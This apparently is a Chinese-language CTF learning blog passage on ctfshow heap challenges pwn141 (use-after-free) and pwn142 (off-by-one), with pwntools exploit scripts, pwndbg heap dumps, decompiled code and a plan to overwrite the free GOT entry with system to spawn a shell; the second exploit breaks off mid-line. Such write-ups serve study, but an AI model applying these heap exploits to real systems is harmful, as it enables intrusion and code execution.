<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/linkpwn/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>保护几乎全开了。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn141&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,xxxx)</span><br><span class="line">use = <span class="number">0x08049684</span></span><br><span class="line"><span class="comment">#定义三个函数方便用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content :&quot;</span>,content)	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_note</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add_note(<span class="number">32</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add_note(<span class="number">32</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">8</span>,p32(use))</span><br><span class="line"></span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    b&#x27;cat: /ctfshow_flag&#x27;</span><br><span class="line">cat: /ctfshow_flag[DEBUG] Received 0x1e bytes:</span><br><span class="line">    00000000  3a 20 e6 b2  a1 e6 9c 89  e9 82 a3 e4  b8 aa e6 96  │: ··│····│····│····│</span><br><span class="line">    00000010  87 e4 bb b6  e6 88 96 e7  9b ae e5 bd  95 0a        │····│····│····│··│</span><br><span class="line">    0000001e</span><br><span class="line">: 没有那个文件或目录</span><br><span class="line">//本地打通</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">[DEBUG] Received 0x106 bytes:</span><br><span class="line">    b&#x27;ctfshow&#123;9f96328a-9405-447f-97a5-c2b73d8307e1&#125;\n&#x27;</span><br><span class="line">    b&#x27;-------------------------\n&#x27;</span><br><span class="line">    b&#x27;       CTFshowNote       \n&#x27;</span><br><span class="line">    b&#x27;-------------------------\n&#x27;</span><br><span class="line">    b&#x27;    1. Add note          \n&#x27;</span><br><span class="line">    b&#x27;    2. Delete note       \n&#x27;</span><br><span class="line">    b&#x27;    3. Print note        \n&#x27;</span><br><span class="line">    b&#x27;    4. Exit              \n&#x27;</span><br><span class="line">    b&#x27;-------------------------\n&#x27;</span><br><span class="line">    b&#x27;choice :&#x27;</span><br><span class="line">ctfshow&#123;9f96328a-9405-447f-97a5-c2b73d8307e1&#125;</span><br><span class="line">//远程打通</span><br></pre></td></tr></table></figure>

<p>今天上午就学到这里了，下午继续干web大作业，完整在进行pwndbg调色继续升入了解堆。</p>
<p>申请一个堆块时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)    //指向print_note_content chunk0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d1a8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)  //content0----&gt;chunk0.0</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d1d8</span><br><span class="line">Size: 0x21e28 (with flag bits: 0x21e29)</span><br></pre></td></tr></table></figure>

<p>申请两个堆块时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)     //指向print_note_content chunk0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d1a8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)    //content0----&gt;chunk0.0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d1d8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)   //指向print_note_content chunk1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d1e8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)  //content1----&gt;chunk1.1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d218</span><br><span class="line">Size: 0x21de8 (with flag bits: 0x21de9)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30wx 0x804d198</span><br><span class="line">0x804d198:	0x00000000	0x00000011	0x080492d6	0x0804d1b0   //0x080492d6 存放print_note_content chunk0</span><br><span class="line">0x804d1a8:	0x00000000	0x00000031	0x61616161	0x0000000a   //0x61616161 aaaa</span><br><span class="line">0x804d1b8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d1c8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d1d8:	0x00000000	0x00000011	0x080492d6	0x0804d1f0   //0x080492d6 存放print_note_content chunk0</span><br><span class="line">0x804d1e8:	0x00000000	0x00000031	0x62626262	0x0000000a   //0x62626262 bbbb</span><br><span class="line">0x804d1f8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d208:	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x080492d6</span><br><span class="line">00:0000│  0x80492d6 (print_note_content) ◂— endbr32 </span><br><span class="line">01:0004│  0x80492da (print_note_content+4) ◂— push ebp</span><br><span class="line">02:0008│  0x80492de (print_note_content+8) ◂— sub esp, 4</span><br><span class="line">03:000c│  0x80492e2 (print_note_content+12) ◂— mov word ptr [esi], es</span><br><span class="line">04:0010│  0x80492e6 (print_note_content+16) ◂— add eax, 0x2d1a</span><br><span class="line">05:0014│  0x80492ea (print_note_content+20) ◂— add byte ptr [ebx + 0x528b0855], cl</span><br><span class="line">06:0018│  0x80492ee (print_note_content+24) ◂— mov edx, dword ptr [edx + 4]</span><br><span class="line">07:001c│  0x80492f2 (print_note_content+28) ◂— in al, dx</span><br><span class="line">pwndbg&gt; telescope 0x080492d6</span><br><span class="line">00:0000│  0x80492d6 (print_note_content) ◂— endbr32 </span><br><span class="line">01:0004│  0x80492da (print_note_content+4) ◂— push ebp</span><br><span class="line">02:0008│  0x80492de (print_note_content+8) ◂— sub esp, 4</span><br><span class="line">03:000c│  0x80492e2 (print_note_content+12) ◂— mov word ptr [esi], es</span><br><span class="line">04:0010│  0x80492e6 (print_note_content+16) ◂— add eax, 0x2d1a</span><br><span class="line">05:0014│  0x80492ea (print_note_content+20) ◂— add byte ptr [ebx + 0x528b0855], cl</span><br><span class="line">06:0018│  0x80492ee (print_note_content+24) ◂— mov edx, dword ptr [edx + 4]</span><br><span class="line">07:001c│  0x80492f2 (print_note_content+28) ◂— in al, dx</span><br></pre></td></tr></table></figure>

<p>可以很明显看到0x080492d6和0x080492d6存放的是print_note_content chunk0。再释放两个堆块，可以看到这些地址都是空闲的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804d198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x804d</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804d1a8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x804d</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804d1d8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x80451ed</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804d1e8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x80451fd</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d218</span><br><span class="line">Size: 0x21de8 (with flag bits: 0x21de9)</span><br></pre></td></tr></table></figure>

<p>然后我们再申请两个8字节堆块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804d1a8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x804d</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d1d8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804d1e8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x80451fd</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d218</span><br><span class="line">Size: 0x21de8 (with flag bits: 0x21de9)</span><br></pre></td></tr></table></figure>

<p>看到0x804d198和0x804d1d8再次被用上了，刚刚我在chunk2的content输入flag，现在我们看看0x804d1d8和0x804d198所指的内容是什么。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30wx 0x804d1d8</span><br><span class="line">0x804d1d8:	0x00000000	0x00000011	0x080492d6	0x0804d1a0 //0x080492d6  ----&gt;print_note_content</span><br><span class="line">0x804d1e8:	0x00000000	0x00000031	0x080451fd	0x88bc415d</span><br><span class="line">0x804d1f8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d208:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d218:	0x00000000	0x00021de9	0x00000000	0x00000000</span><br><span class="line">0x804d228:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d238:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d248:	0x00000000	0x00000000</span><br><span class="line">pwndbg&gt; x/30wx 0x804d198</span><br><span class="line">0x804d198:	0x00000000	0x00000011	0x67616c66	0x0000000a   //0x67616c66 flag</span><br><span class="line">0x804d1a8:	0x00000000	0x00000031	0x0000804d	0x88bc415d</span><br><span class="line">0x804d1b8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d1c8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d1d8:	0x00000000	0x00000011	0x080492d6	0x0804d1a0</span><br><span class="line">0x804d1e8:	0x00000000	0x00000031	0x080451fd	0x88bc415d</span><br><span class="line">0x804d1f8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804d208:	0x00000000	0x00000000</span><br><span class="line">pwndbg&gt; telescope 0x080492d6</span><br><span class="line">00:0000│  0x80492d6 (print_note_content) ◂— endbr32 </span><br><span class="line">01:0004│  0x80492da (print_note_content+4) ◂— push ebp</span><br><span class="line">02:0008│  0x80492de (print_note_content+8) ◂— sub esp, 4</span><br><span class="line">03:000c│  0x80492e2 (print_note_content+12) ◂— mov word ptr [esi], es</span><br><span class="line">04:0010│  0x80492e6 (print_note_content+16) ◂— add eax, 0x2d1a</span><br><span class="line">05:0014│  0x80492ea (print_note_content+20) ◂— add byte ptr [ebx + 0x528b0855], cl</span><br><span class="line">06:0018│  0x80492ee (print_note_content+24) ◂— mov edx, dword ptr [edx + 4]</span><br><span class="line">07:001c│  0x80492f2 (print_note_content+28) ◂— in al, dx </span><br></pre></td></tr></table></figure>

<p>此时如果我们输入的不是flag而是use的地址的话，0x804d198指向的就是use的地址，我们此时只要执行一下3，就能执行use了。</p>
<p>OK现在这个UAF完成的挺好 👌🔥，明日继续 pwn142 🎯 off_by_one 🧠💥</p>
<h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h4><p>今日开始学习off_by_one，进入pwn142之前我打算先学习一下有关off_by_one的知识</p>
<p>看了几篇文章我对堆上的off_by_one理解是：</p>
<ol>
<li><p>prinf函数的%s的结尾会自动加上’&#x2F;x00’，造成单字节漏洞，就是溢出了一个字节，如果两个堆块紧邻的话，就会把溢出的这个字节挤到下一个堆块，覆盖先一个堆块的低字节。</p>
</li>
<li><p>还有一中就是for循环导致的例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gett</span><span class="params">(<span class="type">char</span> *ptr , <span class="type">int</span> size)</span>&#123;</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;= <span class="number">32</span>; i++)&#123;</span><br><span class="line">       vul(i) = getchar();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">chunk0 = (*<span class="type">char</span>)<span class="built_in">malloc</span>(<span class="number">32</span>)</span><br><span class="line">gett(chunk0,<span class="number">32</span>);</span><br></pre></td></tr></table></figure>

<p>这里就会导致for循环的时候多读入了一个字节，造成单字节溢出。</p>
</li>
</ol>
<p>先在开始正式开始pwn142，写完这个今天的任务就算完成。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        delete_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先看main函数，有 create_heap();，edit_heap();， show_heap();， delete_heap();， exit(0);这五个函数，我们依次来看看</p>
<p>create_heap()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)&amp;heaparray + i) = <span class="built_in">malloc</span>(<span class="number">0x10u</span>LL);  <span class="comment">//申请chunk0</span></span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v0 = *((_QWORD *)&amp;heaparray + i); </span><br><span class="line">      *(_QWORD *)(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(size);  <span class="comment">//把chunk1 + 8的位置复制给chunk0.0的指针,同时申请chunk0.0</span></span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)(*((_QWORD *)&amp;heaparray + i) + <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      **((_QWORD **)&amp;heaparray + i) = size; <span class="comment">//把chunk1赋值为size</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input(*(_QWORD *)(*((_QWORD *)&amp;heaparray + i) + <span class="number">8LL</span>), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit_heap()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(*(_QWORD *)(*((_QWORD *)&amp;heaparray + v1) + <span class="number">8LL</span>), **((_QWORD **)&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># read_input(*(_QWORD *)(*((_QWORD *)&amp;heaparray + v1) + <span class="number">8LL</span>), **((_QWORD **)&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br><span class="line"># 可以发现修改的时候会多出来一个字节，就出现了off_by_one的漏洞了</span><br></pre></td></tr></table></figure>

<p>delete_heap();在本题没什么大用处，就不分析了</p>
<p>show_heap()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>,  <span class="comment">//%s的格式化字符串，可以利用got表的地址泄露</span></span><br><span class="line">      **((_QWORD **)&amp;heaparray + v1),</span><br><span class="line">      *(<span class="type">const</span> <span class="type">char</span> **)(*((_QWORD *)&amp;heaparray + v1) + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数到这里就分析完了，开始写思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们先申请一个0x18/0x28的creat(实际上就是两个堆块一个用于储存地址，一个用于储存内容)，利用off_by_one去修改下个堆块的大小为0x40,先申请第二个creat,然后再把修改一个堆块送入/bin/sh同时修改第二个堆块的大小，然后释放第二个堆块，申请0x30的creat,并且内容填为free_got表的地址。最后show一下就可以泄露出free的地址，从而计算出system的地址，在把free_got的地址覆盖为system的地址，最后我们在delete(1)就可以实现system(/bin/sh)。</span><br></pre></td></tr></table></figure>

<p>这里加上几个解释点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 为什么用0x18/0x28</span><br><span class="line">   应为0x18会被自动化整0x20，正好覆盖掉pre_size,然后我们又溢出了一个字节，就可以覆盖到size,从而改变下一个堆块的大小。</span><br><span class="line">2. 为什么会出现两个数组合并成一个的现象(后面调试的时候会出现)，根据堆的遍历机制，当遍历到size为0x40的时候，就直接跳到            top_chunk的位置就，从而导致没识别出第四个堆块。</span><br><span class="line">3. 为什么第三次要用0x30,0x30 + 0x10 = 0x40正好对应上了。</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别为 debug，方便调试</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接远程服务</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28289</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载本地 ELF 文件</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 free 的 GOT 地址</span></span><br><span class="line">free_got = e.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义操作函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size of Heap : &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Content of heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content of heap : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 堆喷射与 UAF 利用步骤</span></span><br><span class="line">creat(<span 